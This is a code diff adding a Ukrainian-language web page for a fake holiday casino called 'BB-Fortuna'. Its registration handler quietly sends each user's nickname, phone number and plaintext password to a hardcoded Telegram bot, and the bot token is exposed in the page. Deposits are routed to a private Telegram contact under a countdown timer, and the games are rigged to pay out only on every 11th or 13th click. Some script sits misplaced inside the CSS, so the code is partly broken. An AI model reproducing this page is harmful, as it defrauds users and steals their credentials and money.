@@ -1,0 +1,1299 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BB-FORTUNA</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg-dark: #020617;        /* Глибокий синій (ніч) */
+            --gold: #fcd34d;           /* Холодне золото */
+            --white-glow: #ffffff;     /* Сяйво */
+            --glass: rgba(255, 255, 255, 0.08); /* Ефект скла */
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Montserrat', sans-serif;
+            background: radial-gradient(circle at top center, #0f172a 0%, #020617 100%);
+            color: var(--white-glow);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Загальний стиль для всіх скляних карток */
+        .glass-container {
+            background: var(--glass);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 25px;
+            padding: 30px 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            width: 300px;
+            margin: 0 auto;
+        }
+/* Стилізація Header */
+.main-header {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 70px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: rgba(255, 255, 255, 0.05);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    z-index: 1000;
+}
+
+/* Логотип з анімацією сяйва */
+.logo {
+    font-size: 24px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    animation: glowText 3s infinite ease-in-out;
+}
+
+@keyframes glowText {
+    0%, 100% { text-shadow: 0 0 5px rgba(255, 255, 255, 0.2); opacity: 0.8; }
+    50% { text-shadow: 0 0 20px rgba(255, 255, 255, 0.8); opacity: 1; }
+}
+/* Налаштування блоку привітання */
+.hero {
+    padding: 120px 20px 40px;
+    display: flex;
+    justify-content: center;
+    text-align: center;
+}
+
+.hero-content {
+    max-width: 600px;
+    animation: fadeInContent 1.5s ease-out forwards;
+}
+
+.hero h1 {
+    font-size: 28px;
+    color: var(--gold);
+    margin-bottom: 20px;
+}
+
+.hero-subtitle {
+    font-size: 18px;
+    font-weight: 300;
+    margin-bottom: 10px;
+}
+
+.hero-text {
+    font-size: 16px;
+    margin-bottom: 25px;
+    opacity: 0.9;
+}
+
+.hero-highlight {
+    background: rgba(252, 211, 77, 0.1);
+    border: 1px solid var(--gold);
+    padding: 15px;
+    border-radius: 15px;
+    font-weight: 600;
+    margin: 20px 0;
+    box-shadow: 0 0 15px rgba(252, 211, 77, 0.2);
+}
+
+.hero-footer {
+    font-size: 14px;
+    font-style: italic;
+    color: var(--white-glow);
+    opacity: 0.7;
+}
+
+/* Анімація появи тексту знизу вгору */
+@keyframes fadeInContent {
+    0% { opacity: 0; transform: translateY(30px); }
+    100% { opacity: 1; transform: translateY(0); }
+}
+/* Блок промокоду */
+.promo-box {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    width: 100%;
+    padding-bottom: 50px;
+}
+
+/* Поле вводу всередині скляної картки */
+#promoInput {
+    width: 100%;
+    box-sizing: border-box;
+    padding: 15px;
+    background: rgba(0, 0, 0, 0.3);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 15px;
+    color: #fff;
+    text-align: center;
+    font-size: 16px;
+    font-family: 'Montserrat', sans-serif;
+    outline: none;
+    transition: 0.3s;
+}
+
+#promoInput:focus {
+    border-color: var(--gold);
+    background: rgba(0, 0, 0, 0.5);
+}
+
+/* Статус-повідомлення (правильно/неправильно) */
+.status-msg {
+    margin: 15px 0;
+    font-size: 14px;
+    min-height: 20px;
+    font-weight: 600;
+}
+
+.valid-text { color: var(--success); text-shadow: 0 0 10px rgba(34, 197, 94, 0.3); }
+.invalid-text { color: var(--error); }
+
+/* Налаштування кнопки */
+.main-btn {
+    width: 100%;
+    padding: 16px;
+    border-radius: 50px;
+    border: none;
+    font-weight: 700;
+    font-size: 16px;
+    font-family: 'Montserrat', sans-serif;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    background: linear-gradient(135deg, #fcd34d, #b45309);
+    color: #000;
+}
+
+/* Стан вимкненої кнопки */
+.main-btn.disabled {
+    background: #334155;
+    color: #94a3b8;
+    opacity: 0.5;
+    cursor: not-allowed;
+}
+
+.main-btn:hover:not(.disabled) {
+    transform: scale(1.03);
+    box-shadow: 0 0 20px rgba(252, 211, 77, 0.4);
+}
+/* Стилізація секції реєстрації */
+.reg-section {
+    display: flex;
+    justify-content: center;
+    padding: 20px;
+    animation: fadeInContent 0.8s ease;
+}
+
+.reg-card {
+    width: 320px;
+    text-align: center;
+}
+
+.reg-title {
+    color: var(--gold);
+    font-size: 22px;
+    margin-bottom: 10px;
+}
+
+.reg-subtitle {
+    font-size: 13px;
+    line-height: 1.5;
+    margin-bottom: 25px;
+    opacity: 0.8;
+}
+
+.input-group {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    margin-bottom: 20px;
+}
+
+/* Інпути для реєстрації (вирівнювання тексту зліва) */
+.input-group input {
+    width: 100%;
+    box-sizing: border-box;
+    padding: 14px;
+    background: rgba(0, 0, 0, 0.4);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 12px;
+    color: white;
+    font-family: 'Montserrat', sans-serif;
+    outline: none;
+    text-align: left;
+}
+
+.input-group input:focus {
+    border-color: var(--gold);
+}
+
+.reg-note {
+    font-size: 10px;
+    margin-top: 15px;
+    opacity: 0.5;
+}
+
+
+/* Ігровий зал */
+.game-hall {
+    padding: 100px 20px 50px;
+    animation: fadeInContent 0.8s ease;
+    max-width: 500px;
+    margin: 0 auto;
+    text-align: center;
+}
+
+.balance-badge {
+    display: inline-block;
+    background: rgba(252, 211, 77, 0.15);
+    border: 1px solid var(--gold);
+    padding: 10px 25px;
+    border-radius: 50px;
+    font-weight: 700;
+    color: var(--gold);
+    margin: 20px 0 30px;
+}
+
+.game-grid {
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+}
+
+.game-card {
+    background: var(--glass);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 20px;
+    padding: 15px;
+    display: flex;
+    align-items: center;
+    gap: 15px;
+    transition: 0.3s;
+}
+
+.game-card:hover {
+    border-color: var(--gold);
+    background: rgba(255, 255, 255, 0.12);
+}
+
+.game-emoji {
+    font-size: 30px;
+    background: rgba(0,0,0,0.3);
+    width: 60px;
+    height: 60px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 15px;
+}
+
+.game-details {
+    flex-grow: 1;
+    text-align: left;
+}
+
+.game-details h3 {
+    margin: 0;
+    font-size: 16px;
+    color: var(--gold);
+}
+
+.game-details p {
+    margin: 4px 0 0;
+    font-size: 11px;
+    opacity: 0.6;
+}
+
+.play-btn-game {
+    background: var(--gold);
+    color: #000;
+    border: none;
+    padding: 10px 18px;
+    border-radius: 12px;
+    font-weight: 700;
+    cursor: pointer;
+    font-size: 13px;
+}
+/* Панель рахунків */
+.stats-panel {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 20px;
+    justify-content: center;
+}
+.stat-box {
+    background: rgba(255, 255, 255, 0.05);
+    padding: 10px;
+    border-radius: 15px;
+    border: 1px solid var(--gold);
+    flex: 1;
+    min-width: 120px;
+}
+.stat-label { font-size: 10px; display: block; opacity: 0.7; margin-bottom: 5px; }
+.stat-value { font-size: 16px; font-weight: bold; color: var(--gold); }
+
+/* Модальне вікно гри */
+.modal {
+    position: fixed;
+    top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(0, 0, 0, 0.95);
+    z-index: 2000;
+    display: flex; align-items: center; justify-content: center;
+}
+.modal-content {
+    background: var(--bg-dark);
+    border: 2px solid var(--gold);
+    padding: 25px;
+    border-radius: 25px;
+    width: 90%;
+    max-width: 350px;
+    text-align: center;
+}
+.game-scene {
+    height: 120px;
+    background: rgba(255, 255, 255, 0.03);
+    margin: 15px 0;
+    border-radius: 20px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 50px;
+}
+/* Додай це в самий кінець блоку style */
+.modal {
+    opacity: 0;
+    transition: opacity 0.4s ease;
+}
+.modal.active {
+    opacity: 1;
+}
+.modal-content {
+    transform: scale(0.8);
+    transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+}
+.modal.active .modal-content {
+    transform: scale(1);
+}
+/* Анімація польоту (футбол/баскетбол) */
+@keyframes flyIn {
+    0% { transform: translateY(100px) scale(0.5); opacity: 0; }
+    50% { transform: translateY(-50px) scale(1.2); }
+    100% { transform: translateY(0) scale(1); opacity: 1; }
+}
+
+/* Анімація обертання слотів */
+@keyframes spinSlot {
+    0% { transform: rotateX(0deg); }
+    100% { transform: rotateX(1080deg); }
+}
+
+/* Анімація тремтіння (подарунок) */
+@keyframes shakeBox {
+    0%, 100% { transform: translateX(0); }
+    25% { transform: translateX(-10px) rotate(-5deg); }
+    75% { transform: translateX(10px) rotate(5deg); }
+}
+
+.animate-fly { animation: flyIn 0.8s ease-out; }
+.animate-spin { animation: spinSlot 1.2s cubic-bezier(0.45, 0.05, 0.55, 0.95); }
+.animate-shake { animation: shakeBox 0.2s infinite; }
+/* Стиль для списку історії в кабінеті */
+.history-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 10px;
+    background: rgba(255, 255, 255, 0.03);
+    border-radius: 10px;
+    margin-bottom: 8px;
+    border-left: 3px solid var(--gold);
+}
+.history-type { font-size: 12px; font-weight: 600; }
+.history-date { font-size: 10px; opacity: 0.5; }
+.history-amt { font-weight: 700; color: var(--gold); }
+/* Робимо футер елітним */
+footer p {
+    font-weight: 300;
+}
+
+/* Ефект легкої золотистої димки для всього сайту */
+body::after {
+    content: "";
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: radial-gradient(circle at 50% 50%, transparent 80%, rgba(212, 175, 55, 0.05) 100%);
+    pointer-events: none;
+    z-index: 9999;
+}
+
+/* Плавна поява всіх секцій */
+.reg-section, .step-content {
+    animation: fadeInPage 0.8s ease-out;
+}
+
+@keyframes fadeInPage {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+document.getElementById('actionBtn').onclick = () => {
+    const bet = parseFloat(document.getElementById('betAmount').value);
+    const scene = document.getElementById('gameScene');
+    const gameTitle = document.getElementById('activeGameTitle').textContent;
+    const btn = document.getElementById('actionBtn');
+
+    if (window.balance < bet) {
+        alert("❌ Недостатньо коштів на балансі!");
+        return;
+    }
+
+    // Знімаємо ставку
+    window.balance -= bet;
+    window.clickCounter++;
+    updateUI();
+    
+    btn.disabled = true;
+    btn.textContent = "ГРАЄМО...";
+
+    // --- ЛОГІКА АНІМАЦІЙ ДЛЯ КОЖНОЇ ГРИ ---
+    
+    if (gameTitle.includes("SLOT")) {
+        // Обертання слотів (швидка зміна емодзі)
+        let slotIcons = ["🎰", "💎", "🍒", "🔔", "7️⃣", "🍋"];
+        scene.classList.add('animate-spin-fast');
+        let i = 0;
+        let interval = setInterval(() => {
+            scene.textContent = slotIcons[i % slotIcons.length];
+            i++;
+        }, 100);
+        setTimeout(() => {
+            clearInterval(interval);
+            scene.classList.remove('animate-spin-fast');
+            finishGameProcess(bet, gameTitle, scene);
+        }, 1500);
+
+    } else if (gameTitle.includes("BASKET") || gameTitle.includes("FOOTBALL")) {
+        // Політ м'яча
+        scene.classList.add('animate-fly');
+        setTimeout(() => {
+            scene.classList.remove('animate-fly');
+            finishGameProcess(bet, gameTitle, scene);
+        }, 800);
+
+    } else if (gameTitle.includes("GIFT")) {
+        // Тремтіння коробки
+        scene.classList.add('animate-shake');
+        setTimeout(() => {
+            scene.classList.remove('animate-shake');
+            finishGameProcess(bet, gameTitle, scene);
+        }, 1200);
+
+    } else if (gameTitle.includes("SNOWBALL")) {
+        // Сніжка (стискання перед кидком)
+        scene.style.transform = "scale(0.5)";
+        setTimeout(() => {
+            scene.style.transform = "scale(1.5) translateX(100px)";
+            setTimeout(() => {
+                scene.style.transform = "scale(1)";
+                finishGameProcess(bet, gameTitle, scene);
+            }, 400);
+        }, 300);
+    } else {
+        finishGameProcess(bet, gameTitle, scene);
+    }
+};
+
+// Фінальна обробка результату
+function finishGameProcess(bet, title, scene) {
+    const btn = document.getElementById('actionBtn');
+    // Шанс виграшу (кожен 11-й клік)
+    let isWin = (window.clickCounter % 11 === 0);
+
+    if (isWin) {
+        let win = bet * (bet >= 300 ? 7 : 3);
+        window.balance += win;
+        scene.textContent = "💰✨";
+        scene.style.filter = "drop-shadow(0 0 10px gold)";
+        setTimeout(() => alert(`🎉 ВЕЛИКИЙ ВИГРАШ! \nВи отримали: ${win.toFixed(2)} ₴`), 100);
+    } else {
+        scene.textContent = "❌";
+        scene.style.filter = "none";
+        setTimeout(() => alert("Спробуйте ще раз! Наступного разу пощастить 🍀"), 100);
+    }
+
+    btn.disabled = false;
+    btn.textContent = "ГРАТИ";
+    updateUI();
+}
+@keyframes bubblePulse {
+    0% { transform: scale(1); box-shadow: 0 4px 15px rgba(0,0,0,0.4), 0 0 0px rgba(36, 161, 222, 0); }
+    50% { transform: scale(1.08); box-shadow: 0 4px 20px rgba(0,0,0,0.5), 0 0 20px rgba(36, 161, 222, 0.6); }
+    100% { transform: scale(1); box-shadow: 0 4px 15px rgba(0,0,0,0.4), 0 0 0px rgba(36, 161, 222, 0); }
+}
+
+#supportBubble:hover {
+    transform: scale(1.15) rotate(5deg) !important;
+}
+.particle {
+    position: absolute;
+    background: radial-gradient(circle, rgba(252,211,77,0.8) 0%, rgba(252,211,77,0) 70%);
+    border-radius: 50%;
+    pointer-events: none;
+    opacity: 0.5;
+}
+
+@keyframes floatParticle {
+    0% { transform: translateY(0) translateX(0); opacity: 0; }
+    50% { opacity: 0.6; }
+    100% { transform: translateY(-100vh) translateX(50px); opacity: 0; }
+}
+
+    </style>
+</head>
+<body>
+<section id="heroBlock" class="hero">
+    <div class="hero-content">
+        <h1>🎄 Вітаємо у BB-Fortuna</h1>
+        <p class="hero-subtitle">❄️ Преміальний новорічний простір інтерактивних розваг</p>
+        <p class="hero-text">🎮 Грайте, насолоджуйтесь процесом та відкривайте святкові бонуси</p>
+        <div class="hero-highlight">
+            🎁 Активуйте промокод і отримайте 100 грн на ігровий гаманець
+        </div>
+        <p class="hero-footer">✨ Почніть свою святкову пригоду вже зараз</p>
+    </div>
+</section>
+
+<header class="main-header">
+    <div class="logo">
+        <span class="snow-icon">❄️</span>
+        BB-Fortuna
+    </div>
+</header>
+<section id="promoBlock" class="promo-box">
+    <div class="glass-container">
+        <input type="text" id="promoInput" placeholder="Введіть новорічний промокод" autocomplete="off">
+        <div id="promoStatus" class="status-msg"></div>
+        <button id="nextBtn" class="main-btn disabled" disabled>Далі</button>
+    </div>
+</section>
+<section id="registrationStep" class="reg-section" style="display: none;">
+    <div class="glass-container reg-card" style="width: 340px;">
+        <h2 class="reg-title">📝 Реєстрація</h2>
+        <p class="reg-subtitle">Будь ласка, заповніть усі поля для створення акаунту</p>
+        
+        <div class="input-group">
+            <input type="text" id="userSurname" placeholder="Прізвище*">
+            <input type="text" id="userName" placeholder="Ім'я*">
+            <input type="text" id="userNickname" placeholder="Імʼя користувача*">
+            <input type="text" id="userSocial" placeholder="Соцмережа*">
+            <input type="tel" id="userPhone" placeholder="Телефон*">
+            <input type="password" id="userPass" placeholder="Пароль*">
+            <input type="password" id="userPassConfirm" placeholder="Підтвердити пароль*">
+        </div>
+
+        <button id="finishRegBtn" class="main-btn">Завершити реєстрацію</button>
+    </div>
+</section>
+<section id="reviewsStep" class="reg-section" style="display: none; flex-direction: column; align-items: center; padding: 100px 20px 50px;">
+    <div class="glass-container" style="width: 320px;">
+        <h2 style="color: var(--gold); margin-top: 0; font-size: 22px;">💬 Відгуки</h2>
+        <div id="reviewsContainer" style="max-height: 350px; overflow-y: auto; text-align: left; margin-bottom: 20px; padding-right: 5px; scrollbar-width: thin;">
+            </div>
+        <div style="border-top: 1px solid rgba(255,255,255,0.1); padding-top: 15px;">
+            <textarea id="userReviewText" placeholder="Напишіть ваш відгук…" style="width: 100%; box-sizing: border-box; height: 60px; background: #000; color: #fff; border: 1px solid rgba(255,255,255,0.2); border-radius: 10px; padding: 10px; margin-bottom: 10px; resize: none; outline: none; font-family: inherit; font-size: 13px;"></textarea>
+            <button onclick="handleUserReview()" class="main-btn" style="padding: 10px; font-size: 14px;">Надіслати</button>
+            <button onclick="hideReviewsSection()" style="background:transparent; color:#fff; border:none; cursor:pointer; font-size: 12px; opacity: 0.6; margin-top: 10px; width: 100%;">← Назад до ігор</button>
+        </div>
+    </div>
+</section>
+
+<section id="gameHall" class="game-hall" style="display: none;">
+    <div class="stats-panel">
+        <div class="stat-box">
+            <span class="stat-label">💰 Баланс (гра)</span>
+            <span id="userBalance">0.00</span> ₴
+        </div>
+        <div class="stat-box">
+            <span class="stat-label">💳 Гаманець (вивід)</span>
+            <span id="userWallet">100.00</span> ₴
+        </div>
+    </div>
+
+    <div style="display: flex; flex-direction: column; gap: 10px; padding: 0 5px; margin-bottom: 25px;">
+        <button onclick="openDeposit()" style="width: 100%; background: linear-gradient(135deg, #fcd34d, #b45309); border: none; color: #000; padding: 14px; border-radius: 12px; font-weight: 700; cursor: pointer;">
+    ➕ ПОПОВНИТИ БАЛАНС
+</button>
+    <div style="display: flex; gap: 8px; flex-wrap: wrap;">
+    <button onclick="sendToWallet()" style="flex: 1; background: rgba(34, 197, 94, 0.1); border: 1px solid #22c55e; color: #22c55e; padding: 12px; border-radius: 12px; font-weight: 600; font-size: 10px; cursor: pointer;">
+        📥 ГАМАНЕЦЬ
+    </button>
+
+    <button onclick="showReviewsSection()" style="flex: 1; background: rgba(252, 211, 77, 0.1); border: 1px solid var(--gold); color: var(--gold); padding: 12px; border-radius: 12px; font-weight: 600; font-size: 10px; cursor: pointer;">
+        💬 ВІДГУКИ
+    </button>
+<button onclick="showAccount()" style="flex: 1; background: rgba(255, 255, 255, 0.1); border: 1px solid #fff; color: #fff; padding: 12px; border-radius: 12px; font-weight: 600; font-size: 10px; cursor: pointer;">
+    👤 КАБІНЕТ
+</button>
+    <button onclick="requestWithdraw()" style="flex: 1; background: rgba(255, 255, 255, 0.05); border: 1px solid #fff; color: #fff; padding: 12px; border-radius: 12px; font-weight: 600; font-size: 10px; cursor: pointer;">
+        📤 ВИВЕСТИ
+    </button>
+</div>
+    </div>
+
+    <div class="game-grid">
+        <div class="game-card" onclick="openGame('BASKET SHOT', '🏀')">
+            <div class="game-emoji">🏀</div>
+            <div class="game-details"><h3>BASKET SHOT</h3><p>Кидок у кільце</p></div>
+        </div>
+        <div class="game-card" onclick="openGame('FOOTBALL GOAL', '⚽')">
+            <div class="game-emoji">⚽</div>
+            <div class="game-details"><h3>FOOTBALL GOAL</h3><p>Удар по воротах</p></div>
+        </div>
+        <div class="game-card" onclick="openGame('NEW YEAR SLOT', '🎰')">
+            <div class="game-emoji">🎰</div>
+            <div class="game-details"><h3>NEW YEAR SLOT</h3><p>Святкові барабани</p></div>
+        </div>
+        <div class="game-card" onclick="openGame('SNOWBALL TARGET', '🎯')">
+            <div class="game-emoji">🎯</div>
+            <div class="game-details"><h3>SNOWBALL TARGET</h3><p>Сніжка в мішень</p></div>
+        </div>
+        <div class="game-card" onclick="openGame('GIFT BOX', '🎁')">
+            <div class="game-emoji">🎁</div>
+            <div class="game-details"><h3>GIFT BOX</h3><p>Відкрий подарунок</p></div>
+        </div>
+    </div>
+</section>
+<section id="accountSection" class="reg-section" style="display: none; flex-direction: column; align-items: center; padding: 100px 20px 50px;">
+    <div class="glass-container" style="width: 340px; text-align: left;">
+        <h2 style="color: var(--gold); text-align: center; margin-top: 0;">👤 Мій Профіль</h2>
+        
+        <div style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 15px; margin-bottom: 20px; border: 1px solid rgba(252,211,77,0.2);">
+            <p style="margin: 5px 0;"><strong>Нік:</strong> <span id="accNick">---</span></p>
+            <p style="margin: 5px 0;"><strong>Тел:</strong> <span id="accPhone">---</span></p>
+            <p style="margin: 5px 0;"><strong>Соцмережа:</strong> <span id="accSocial">---</span></p>
+        </div>
+
+        <h3 style="font-size: 14px; color: var(--gold); margin-bottom: 10px;">🕒 Історія операцій</h3>
+        <div id="historyList" style="max-height: 200px; overflow-y: auto; margin-bottom: 15px; padding-right: 5px;">
+            <p style="text-align: center; opacity: 0.5; font-size: 12px;">Операцій ще не було</p>
+        </div>
+
+        <button onclick="hideAccount()" class="main-btn" style="padding: 10px; font-size: 14px;">← Назад до ігор</button>
+<button onclick="logoutUser()" style="background:#ef4444; color:white; width:100%; padding:12px; border:none; border-radius:12px; margin-top:10px; font-weight:700; cursor:pointer; font-family: 'Montserrat', sans-serif;">
+    🔴 ВИЙТИ З АКАУНТУ
+</button>
+    </div>
+</section>
+
+<div id="depositModal" class="modal" style="display: none;">
+    <div class="modal-content" style="max-width: 400px;">
+        <div id="depStep1">
+            <h2 style="color:var(--gold)">💰 Поповнення</h2>
+            <p style="font-size: 12px; opacity: 0.8;">Мінімальна сума: 200 ₴</p>
+            <input type="number" id="depAmount" placeholder="Введіть суму" style="width:80%; padding:12px; margin:15px 0; background:#000; color:#fff; border:1px solid var(--gold); border-radius:10px; text-align:center;">
+            <button onclick="startDeposit()" class="main-btn">ПРОДОВЖИТИ</button>
+            <button onclick="closeDeposit()" style="background:transparent; color:#fff; border:none; margin-top:10px; cursor:pointer;">Скасувати</button>
+        </div>
+<div id="depStep2" style="display: none;">
+    <h2 style="color:var(--gold)">⏳ Очікування</h2>
+    <div id="timer" style="font-size: 24px; font-weight: 700; margin: 10px 0; color: #ef4444;">10:00</div>
+    <p style="font-size: 13px; margin-bottom: 20px;">Оплатіть за реквізитами в чаті та надішліть скріншот.</p>
+    
+    <a href="https://t.me/albinaaa_12" target="_blank" style="display: block; width: 100%; box-sizing: border-box; background: #22c55e; color: #fff; text-decoration: none; padding: 12px 0; border-radius: 12px; font-weight: 700; margin-bottom: 10px; font-size: 14px; text-align: center;">
+        💬 ЧАТ З МЕНЕДЖЕРОМ
+    </a>
+    
+    <button onclick="confirmPayment()" class="main-btn" style="width: 100%;">Я ОПЛАТИВ</button>
+</div>
+        <div id="depStep3" style="display: none;">
+            <h2 style="color:var(--gold)">💎 Активація</h2>
+            <p style="font-size: 13px;">Введіть код від менеджера:</p>
+            <input type="text" id="depCode" placeholder="Код" style="width:80%; padding:12px; margin:15px 0; background:#000; color:var(--gold); border:1px solid var(--gold); border-radius:10px; text-align:center; font-weight:700;">
+            <button onclick="activateDep()" class="main-btn">АКТИВУВАТИ</button>
+        </div>
+    </div>
+</div>
+<div id="gameModal" class="modal" style="display: none;">
+    <div class="modal-content">
+        <h2 id="activeGameTitle" style="color:var(--gold)">Гра</h2>
+        <div id="gameScene" class="game-scene">❄️</div>
+        <div style="margin-bottom:10px">Ставка (5 - 2000 ₴):</div>
+        <input type="number" id="betAmount" value="5" min="5" max="2000" style="width:80%; padding:10px; background:#000; color:var(--gold); border:1px solid var(--gold); border-radius:10px; text-align:center; margin-bottom:15px;">
+                <div style="display:flex; flex-direction:column; gap:10px;">
+            <button id="actionBtn" class="main-btn">ГРАТИ</button>
+            <button onclick="showRules()" style="background:transparent; color:var(--gold); border:1px solid var(--gold); padding:10px; border-radius:50px; font-size:12px;">📋 Умови гри</button>
+            <button onclick="closeGameModal()" style="background:transparent; color:#fff; border:1px solid rgba(255,255,255,0.2); padding:10px; border-radius:50px;">Назад</button>
+        </div>
+    </div>
+</div>
+<script>
+window.onload = () => {
+window.historyData = []; // <--- Ось цей рядок вставляй сюди
+    // 1. ОГОЛОШЕННЯ ЗМІННИХ
+    const validPromos = ["FORTUNA2025", "NEWYEAR100", "GIFT2025", "SNOW100", "LUCKYBB", "WINTERMAGIC", "SANTA100", "CELEBRATE", "BONUSBB", "MAGIC2025"];
+    const tgToken = "8235818566:AAFyHI7pMv-ZwQNIi1KLGp2bvtpxRiNZz8c";
+    const tgChatId = "7479398365";
+
+    window.balance = 0;   // Ігровий баланс (починаємо з нуля)
+    window.wallet = 100;  // Бонус за промокод у гаманець
+    window.clickCounter = 0;
+
+    // 2. ФУНКЦІЯ ОНОВЛЕННЯ ЕКРАНУ
+    window.updateUI = function() {
+        document.getElementById('userBalance').textContent = window.balance.toFixed(2);
+        document.getElementById('userWallet').textContent = window.wallet.toFixed(2);
+    };
+
+    // 3. ЛОГІКА ПРОМОКОДУ
+    const promoInput = document.getElementById('promoInput');
+    const nextBtn = document.getElementById('nextBtn');
+    const promoStatus = document.getElementById('promoStatus');
+
+    promoInput.addEventListener('input', () => {
+        const val = promoInput.value.trim().toUpperCase();
+        if (validPromos.includes(val)) {
+            promoStatus.innerHTML = "<span style='color:#22c55e'>✅ Активовано!</span>";
+            nextBtn.disabled = false;
+            nextBtn.classList.remove('disabled');
+        } else {
+            promoStatus.innerHTML = val ? "<span style='color:#ef4444'>❌ Невірно</span>" : "";
+            nextBtn.disabled = true;
+            nextBtn.classList.add('disabled');
+        }
+    });
+
+    nextBtn.onclick = () => {
+        document.getElementById('heroBlock').style.display = 'none';
+        document.getElementById('promoBlock').style.display = 'none';
+        document.getElementById('registrationStep').style.display = 'flex';
+    };
+
+    // 4. РЕЄСТРАЦІЯ
+    document.getElementById('finishRegBtn').onclick = async () => {
+        const nick = document.getElementById('userNickname').value.trim();
+        const phone = document.getElementById('userPhone').value.trim();
+        const promo = promoInput.value.trim().toUpperCase();
+        const pass = document.getElementById('userPass').value;
+
+        if (!nick || !phone) return alert("Заповніть поля!");
+
+        const message = `<b>🔔 РЕЄСТРАЦІЯ:</b>\n🎟 Промокод: ${promo}\n🆔 Нік: ${nick}\n📞 Тел: ${phone}\n🔑 Пароль: ${pass}`;
+
+        await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: tgChatId, text: message, parse_mode: "HTML" })
+        });
+
+        alert("Успішно! 100 грн додано у ваш гаманець.");
+        document.getElementById('registrationStep').style.display = 'none';
+        document.getElementById('gameHall').style.display = 'block';
+        updateUI();
+    };
+
+    // 5. КЕРУВАННЯ МОДАЛЬНИМ ВІКНОМ ГРИ
+    window.openGame = function(title, emoji) {
+        const modal = document.getElementById('gameModal');
+        document.getElementById('activeGameTitle').textContent = title;
+        document.getElementById('gameScene').textContent = emoji;
+        modal.style.display = 'flex';
+        setTimeout(() => modal.classList.add('active'), 10);
+    };
+
+    window.closeGameModal = function() {
+        const modal = document.getElementById('gameModal');
+        modal.classList.remove('active');
+        setTimeout(() => modal.style.display = 'none', 400);
+    };
+    // 6. ЛОГІКА КНОПКИ "ГРАТИ"
+    document.getElementById('actionBtn').onclick = () => {
+        const bet = parseFloat(document.getElementById('betAmount').value);
+        const scene = document.getElementById('gameScene');
+        const gameTitle = document.getElementById('activeGameTitle').textContent;
+
+        if (window.balance < bet) {
+            alert("❌ Недостатньо коштів на балансі!");
+            return;
+        }
+
+        // 1. ПІДГОТОВКА
+        window.balance -= bet;
+        window.clickCounter++;
+        updateUI();
+        scene.className = "game-scene"; 
+        document.getElementById('actionBtn').disabled = true;
+        document.getElementById('actionBtn').textContent = "ГРАЄМО...";
+
+        // 2. ЗАПУСК АНІМАЦІЇ (Дія)
+        if (gameTitle.includes("SLOT")) {
+            scene.classList.add("animate-spin");
+            scene.textContent = "🎰";
+        } else if (gameTitle.includes("BASKET")) {
+            scene.classList.add("animate-fly");
+            scene.textContent = "🏀";
+        } else if (gameTitle.includes("FOOTBALL")) {
+            scene.classList.add("animate-fly");
+            scene.textContent = "⚽";
+        } else if (gameTitle.includes("GIFT")) {
+            scene.classList.add("animate-shake");
+            scene.textContent = "🎁";
+        } else {
+            scene.textContent = "🎲";
+        }
+
+        // 3. МОМЕНТ РЕЗУЛЬТАТУ (Коли анімація закінчилася)
+        setTimeout(() => {
+            scene.classList.remove("animate-fly", "animate-spin", "animate-shake");
+            
+            let isWin = (window.clickCounter % 13 === 0); 
+            
+            if (isWin) {
+                let win = bet * (bet >= 300 ? 7 : 3);
+                window.balance += win;
+
+                if (gameTitle.includes("BASKET")) scene.textContent = "🗑️✨ ГОЛ!";
+                else if (gameTitle.includes("FOOTBALL")) scene.textContent = "🥅🔥 ГОООЛ!";
+                else if (gameTitle.includes("SLOT")) scene.textContent = "💎💎💎";
+                else scene.textContent = "💰";
+
+                // ПАУЗА ПЕРЕД ВІКНОМ УСПІХУ (0.8 сек), щоб гравець побачив результат
+                setTimeout(() => {
+                    alert(`✨ ВЕЛИКА ПЕРЕМОГА! ✨\nВи отримали: ${win.toFixed(2)} ₴`);
+                    resetButton();
+                }, 800);
+
+            } else {
+                if (gameTitle.includes("BASKET")) scene.textContent = "❌🏀 МИМО";
+                else if (gameTitle.includes("FOOTBALL")) scene.textContent = "❌🧤 СЕЙВ";
+                else if (gameTitle.includes("SLOT")) scene.textContent = "🍋🍒🍊";
+                else scene.textContent = "❌";
+
+                // ПАУЗА ПЕРЕД ВІКНОМ ПРОГРАШУ (0.8 сек)
+                setTimeout(() => {
+                    alert("Цього разу не пощастило. Наступний кидок точно буде в ціль! 🍀");
+                    resetButton();
+                }, 800);
+            }
+        }, 1200); // Тривалість анімації дії
+
+        function resetButton() {
+            document.getElementById('actionBtn').disabled = false;
+            document.getElementById('actionBtn').textContent = "ГРАТИ";
+            updateUI();
+        }
+    };
+
